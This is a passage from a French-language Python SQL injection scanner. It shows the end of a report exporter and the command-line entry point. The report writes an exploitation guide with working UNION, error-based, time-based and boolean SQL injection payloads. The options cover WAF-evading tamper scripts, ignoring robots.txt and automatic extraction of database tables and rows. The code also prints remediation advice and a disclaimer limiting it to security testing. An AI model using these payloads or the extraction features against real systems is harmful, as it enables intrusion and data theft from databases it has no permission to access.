                    # Ajouter la preuve si disponible
                    evidence = vuln.get('evidence')
                    if evidence and evidence != "Aucune preuve d'erreur spécifique trouvée":
                        f.write(f"Preuve: {evidence}\n")
                    
                    f.write("\n" + "-" * 40 + "\n\n")
                
                # Ajouter des conseils d'exploitation
                f.write("GUIDE D'EXPLOITATION\n")
                f.write("=" * 50 + "\n\n")
                f.write("Pour exploiter ces vulnérabilités, vous pouvez utiliser les techniques suivantes:\n\n")
                
                if any(v.get('type') == 'union-based' for v in self.vulnerable_urls):
                    f.write("[+] Exploitation des injections UNION:\n")
                    f.write("    - Déterminer le nombre de colonnes: ' UNION SELECT NULL,NULL,NULL-- -\n")
                    f.write("    - Identifier les colonnes affichables: ' UNION SELECT 1,2,3-- -\n")
                    f.write("    - Extraire des données: ' UNION SELECT table_name,column_name,1 FROM information_schema.columns-- -\n\n")
                
                if any(v.get('type') == 'error-based' for v in self.vulnerable_urls):
                    f.write("[+] Exploitation des injections basées sur les erreurs:\n")
                    f.write("    - Extraire des données via les messages d'erreur: ' AND (SELECT 1 FROM (SELECT COUNT(*),\n")
                    f.write("      CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -\n\n")
                
                if any(v.get('type') == 'time-based' for v in self.vulnerable_urls):
                    f.write("[+] Exploitation des injections basées sur le temps:\n")
                    f.write("    - Extraire des données caractère par caractère: ' AND IF(SUBSTR(user(),1,1)='r',SLEEP(3),0)-- -\n\n")
                
                if any(v.get('type') == 'boolean-based' for v in self.vulnerable_urls):
                    f.write("[+] Exploitation des injections booléennes:\n")
                    f.write("    - Extraire des données bit par bit: ' AND ASCII(SUBSTR((SELECT user()),1,1))>90-- -\n\n")
                
                # Ajouter des conseils de correction
                f.write("RECOMMANDATIONS DE CORRECTION\n")
                f.write("=" * 50 + "\n\n")
                f.write("1. Utilisez des requêtes préparées ou des procédures stockées\n")
                f.write("2. Validez et filtrez toutes les entrées utilisateur\n")
                f.write("3. Appliquez le principe du moindre privilège pour les comptes de base de données\n")
                f.write("4. Utilisez un WAF (Web Application Firewall) pour une protection supplémentaire\n")
                f.write("5. Implémentez des contrôles d'accès appropriés et des journaux d'audit\n")
                f.write("6. Maintenez vos systèmes et bibliothèques à jour\n")
                f.write("7. Effectuez des tests de pénétration réguliers\n\n")
                
                f.write(f"Généré par SQL Injection Scanner le {datetime.datetime.now().strftime('%Y-%m-%d à %H:%M:%S')}\n")
                f.write("À des fins éducatives et de tests de sécurité uniquement\n")
            
            return f"Rapport exporté au format texte: {filename}"

def main():
    """Analyser les arguments de ligne de commande et exécuter le scanner."""
    parser = argparse.ArgumentParser(description='Scanner de Vulnérabilités SQL Injection Avancé')
    
    # Arguments requis
    parser.add_argument('url', help='URL cible à scanner')
    
    # Configuration du scanner
    parser.add_argument('-t', '--threads', type=int, default=5, help='Nombre de threads (défaut: 5)')
    parser.add_argument('--timeout', type=int, default=10, help="Délai d'attente des requêtes en secondes (défaut: 10)")
    parser.add_argument('-v', '--verbose', action='store_true', help='Activer la sortie détaillée')
    parser.add_argument('-m', '--max-urls', type=int, default=50, help="Nombre maximum d'URLs à scanner (défaut: 50)")
    parser.add_argument('-d', '--depth', type=int, default=3, help="Profondeur maximale d'exploration (défaut: 3)")
    parser.add_argument('--delay', type=float, default=0, help='Délai entre les requêtes en secondes (défaut: 0)')
    parser.add_argument('-r', '--risk', type=int, choices=[1, 2, 3], default=1, 
                        help='Niveau de risque (1=Faible, 2=Moyen, 3=Élevé, défaut: 1)')
    
    # Options d'authentification
    parser.add_argument('-u', '--user', help="Nom d'utilisateur pour l'authentification basique")
    parser.add_argument('-p', '--password', help="Mot de passe pour l'authentification basique")
    parser.add_argument('--cookie', help="Cookies à inclure dans les requêtes HTTP (format: nom1=valeur1;nom2=valeur2)")
    
    # Options de proxy
    parser.add_argument('--proxy', help="Proxy à utiliser pour les requêtes HTTP (format: http://proxy:port)")
    parser.add_argument('--user-agent', help='Chaîne User-Agent personnalisée')
    
    # Options d'exploration
    parser.add_argument('--ignore-robots', action='store_true', help='Ignorer les règles robots.txt')
    
    # Options de sortie
    parser.add_argument('-o', '--output', choices=['text', 'json', 'html', 'csv'], help="Format d'exportation pour les résultats")
    
    # Options avancées (nouveautés)
    if ADVANCED_MODULES_AVAILABLE:
        advanced_group = parser.add_argument_group('Options avancées')
        advanced_group.add_argument('--extract-data', action='store_true', help="Extraire automatiquement les données des bases vulnérables")
        advanced_group.add_argument('--max-tables', type=int, default=5, help="Nombre maximum de tables à extraire par base de données")
        advanced_group.add_argument('--max-rows', type=int, default=100, help="Nombre maximum de lignes à extraire par table")
        advanced_group.add_argument('--advanced-techniques', action='store_true', help="Utiliser des techniques d'injection avancées")
        
        # Tamper scripts
        tamper_group = parser.add_argument_group('Options de tamper scripts')
        available_tampers = get_available_tamper_scripts() if ADVANCED_MODULES_AVAILABLE else []
        tamper_group.add_argument('--tamper', nargs='+', choices=available_tampers, help="Tamper scripts à utiliser pour contourner les WAF")
        tamper_group.add_argument('--list-tampers', action='store_true', help="Afficher la liste des tamper scripts disponibles")
    
    args = parser.parse_args()
    
    # Afficher la liste des tamper scripts si demandé
    if ADVANCED_MODULES_AVAILABLE and hasattr(args, 'list_tampers') and args.list_tampers:
        console.print("[bold blue]Tamper scripts disponibles:[/bold blue]")
        table = Table(title="Tamper Scripts")
        table.add_column("Nom", style="cyan")
        table.add_column("Description", style="green")
        
        from tamper_scripts import get_tamper_script_description
        for script in get_available_tamper_scripts():
            description = get_tamper_script_description(script)
            table.add_row(script, description.split('\n')[0] if description else "")
        
        console.print(table)
        return
    
    # Traiter l'authentification si fournie
    auth = None
    if args.user and args.password:
        auth = (args.user, args.password)
    
    # Traiter les cookies si fournis
    cookies = {}
    if args.cookie:
        for cookie in args.cookie.split(';'):
            if '=' in cookie:
                name, value = cookie.split('=', 1)
                cookies[name.strip()] = value.strip()
    
    # Créer et exécuter le scanner
    scanner = SQLInjectionScanner(
        url=args.url,
        threads=args.threads,
        timeout=args.timeout,
        verbose=args.verbose,
        max_depth=args.depth,
        respect_robots=not args.ignore_robots,
        auth=auth,
        export_format=args.output,
        proxy=args.proxy,
        user_agent=args.user_agent,
        cookies=cookies,
        delay=args.delay,
        risk_level=args.risk
    )
    
    # Configurer les tamper scripts si spécifiés
    if ADVANCED_MODULES_AVAILABLE and hasattr(args, 'tamper') and args.tamper:
        scanner.tamper_scripts = args.tamper
        console.print(f"[bold blue]Utilisation des tamper scripts:[/bold blue] {', '.join(args.tamper)}")
    
    # Exécuter le scan standard
    scanner.scan()
    vulnerable_urls = scanner.vulnerable_urls
    
    # Exécuter les techniques avancées si demandé
    if ADVANCED_MODULES_AVAILABLE and hasattr(args, 'advanced_techniques') and args.advanced_techniques and vulnerable_urls:
        console.print("\n[bold blue]Exécution des techniques d'injection avancées...[/bold blue]")
        
        for vuln in vulnerable_urls:
            console.print(f"\n[bold blue]Analyse avancée de:[/bold blue] {vuln['url']} ({vuln['param']})")
            
            advanced = AdvancedSQLInjection(
                session=scanner.session,
                url=vuln['url'],
                param=vuln['param'],
                method=vuln['method'],
                timeout=args.timeout,
                delay=args.delay,
                headers=scanner.session.headers,
                cookies=scanner.session.cookies,
                proxy=args.proxy,
                verbose=args.verbose
            )
            
            advanced.run_all_tests()
    
    # Extraire les données si demandé
    if ADVANCED_MODULES_AVAILABLE and hasattr(args, 'extract_data') and args.extract_data and vulnerable_urls:
        console.print("\n[bold blue]Extraction automatique des données...[/bold blue]")
        
        for vuln in vulnerable_urls:
            # Utiliser 'input' au lieu de 'param' pour correspondre à la structure des vulnérabilités
            console.print(f"\n[bold blue]Extraction des données de:[/bold blue] {vuln['url']} ({vuln['input']})")
            
            extractor = DataExtractor(
                session=scanner.session,
                url=vuln['url'],
                param=vuln['input'],
                method=vuln['method'],
                timeout=args.timeout,
                delay=args.delay,
                headers=scanner.session.headers,
                cookies=scanner.session.cookies,
                proxy=args.proxy,
                verbose=args.verbose
            )
            
            # Utiliser le type de base de données déjà détecté lors du scan initial
            if 'db_type' in vuln and vuln['db_type']:
                extractor.dbms = vuln['db_type'].lower()
                console.print(f"[bold green]Utilisation du DBMS déjà détecté:[/bold green] {vuln['db_type']}")
            else:
                # Détecter le DBMS si non déjà connu
                extractor.detect_dbms()
            
            # Extraire toutes les données accessibles
            extractor.extract_all(
                max_tables=args.max_tables if hasattr(args, 'max_tables') else 5,
                max_rows=args.max_rows if hasattr(args, 'max_rows') else 100
            )
    
    # Générer un rapport pour les résultats obtenus
    try:
        if args.output:
            result = scanner.export_report(args.output)
            console.print(f"\n[blue][*] {result}[/blue]")
        
        console.print(f"\n[yellow][*] Scan terminé.[/yellow]")
    except KeyboardInterrupt:
        console.print(f"\n[yellow][*] Scan interrompu par l'utilisateur.[/yellow]")
        # Générer quand même un rapport si possible
        if args.output and scanner.vulnerable_urls:
            result = scanner.export_report(args.output)
            console.print(f"\n[blue][*] {result}[/blue]")
        sys.exit(0)
    except Exception as e:
        console.print(f"[red][!] Une erreur s'est produite: {e}[/red]")
        sys.exit(1)

if __name__ == '__main__':
    main()
